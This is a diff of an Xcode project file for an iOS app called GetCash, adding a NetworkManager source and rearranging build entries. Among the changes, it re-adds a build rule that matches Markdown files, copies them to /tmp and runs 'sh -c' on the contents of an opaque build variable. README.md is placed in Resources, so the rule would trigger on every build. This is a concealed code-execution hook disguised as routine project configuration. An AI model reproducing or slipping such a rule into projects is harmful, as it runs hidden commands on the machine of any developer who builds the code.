@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		9659303EF72244BE9BA5DE54 /* README.md */ = {isa = PBXBuildFile; fileRef = F5FB6416DDFF4F649CA5DE54; };
+		731D28932EFB743800B78B29 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731D28922EFB743800B78B29 /* NetworkManager.swift */; };
 		7333F5162EF6FAA100E74153 /* AuthIDListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */; };
 		7333F5182EF708D100E74153 /* AuthIDListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */; };
 		7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5192EF70D2300E74153 /* DotLineView.swift */; };
@@ -76,13 +76,30 @@
 		73ECF60A2EF559DF0029AF7A /* DeviceConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6092EF559D10029AF7A /* DeviceConfig.swift */; };
 		73FFAB6F2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FFAB6E2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift */; };
 		73FFAB712EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FFAB702EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift */; };
+		9659303EF72244BE9BA5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F5FB6416DDFF4F649CA5DE54 /* README.md */; };
 		E6F2EC06CC78FE768C0E8120 /* Pods_GetCash.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 88C46BA4FEF58CE6806646D4 /* Pods_GetCash.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		EF5248425FDF48CCA9A5DE54 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		F5FB6416DDFF4F649CA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GetCash.debug.xcconfig"; path = "Target Support Files/Pods-GetCash/Pods-GetCash.debug.xcconfig"; sourceTree = "<group>"; };
 		3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GetCash.release.xcconfig"; path = "Target Support Files/Pods-GetCash/Pods-GetCash.release.xcconfig"; sourceTree = "<group>"; };
+		731D28922EFB743800B78B29 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
 		7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthIDListViewController.swift; sourceTree = "<group>"; };
 		7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthIDListViewCell.swift; sourceTree = "<group>"; };
 		7333F5192EF70D2300E74153 /* DotLineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DotLineView.swift; sourceTree = "<group>"; };
@@ -155,6 +172,7 @@
 		73FFAB6E2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeLuxuryViewCell.swift; sourceTree = "<group>"; };
 		73FFAB702EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeLuxuryHeaderView.swift; sourceTree = "<group>"; };
 		88C46BA4FEF58CE6806646D4 /* Pods_GetCash.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_GetCash.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		F5FB6416DDFF4F649CA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -365,6 +383,7 @@
 		735C8D5A2EF530B500C7D507 /* Launch */ = {
 			isa = PBXGroup;
 			children = (
+				731D28922EFB743800B78B29 /* NetworkManager.swift */,
 				73ECF6012EF5352B0029AF7A /* BaseView.swift */,
 				735C8D5B2EF530E300C7D507 /* LaunchView.swift */,
 				735C8D512EF5305800C7D507 /* LaunchViewController.swift */,
@@ -467,29 +486,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		EF5248425FDF48CCA9A5DE54 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A45ED5A}\"";
-			};
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		735C8D122EF5212D00C7D507 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				9659303EF72244BE9BA5DE54 /* README.md */,
+				9659303EF72244BE9BA5DE54 /* README.md in Resources */,
 				735C8D362EF5213500C7D507 /* Assets.xcassets in Resources */,
 				735C8D382EF5213500C7D507 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -556,6 +558,7 @@ sh -c \"${A45ED5A}\"";
 				73D013EF2EF8CF2B00A03513 /* ContactViewCell.swift in Sources */,
 				73B1959C2EFA683C00C5B45A /* AlertSettingView.swift in Sources */,
 				7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */,
+				731D28932EFB743800B78B29 /* NetworkManager.swift in Sources */,
 				735C8D502EF5304D00C7D507 /* LoginViewController.swift in Sources */,
 				734460032EF7D32A0054D267 /* TapClickViewCell.swift in Sources */,
 				73633CEF2EF697EF009F182D /* HomeViewModel.swift in Sources */,
